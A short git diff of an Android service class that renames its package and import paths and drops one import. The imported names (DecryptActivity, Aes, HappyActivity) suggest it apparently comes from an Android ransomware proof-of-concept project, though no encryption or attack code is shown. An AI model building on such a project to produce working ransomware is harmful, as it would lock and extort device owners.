@@ -1,4 +1,4 @@
-package alepacheco.com.rw.services;
+package vulpix.com.rw.services;
 
 import android.app.Service;
 import android.content.Context;
@@ -26,14 +26,13 @@ import java.util.Date;
 import java.util.List;
 import java.util.Random;
 
-import alepacheco.com.rw.activityes.DecryptActivity;
-import alepacheco.com.rw.R;
-import alepacheco.com.rw.activityes.HappyActivity;
-import alepacheco.com.rw.apl.Aes;
-import alepacheco.com.rw.apl.BlurBuilder;
-import alepacheco.com.rw.apl.Helper;
-import alepacheco.com.rw.io.IO;
-import alepacheco.com.rw.persistence.LocalStorage;
+import vulpix.com.rw.activityes.DecryptActivity;
+import vulpix.com.rw.R;
+import vulpix.com.rw.activityes.HappyActivity;
+import vulpix.com.rw.apl.Aes;
+import vulpix.com.rw.apl.BlurBuilder;
+import vulpix.com.rw.apl.Helper;
+import vulpix.com.rw.persistence.LocalStorage;
 
 public class MyService extends Service {
     @Nullable
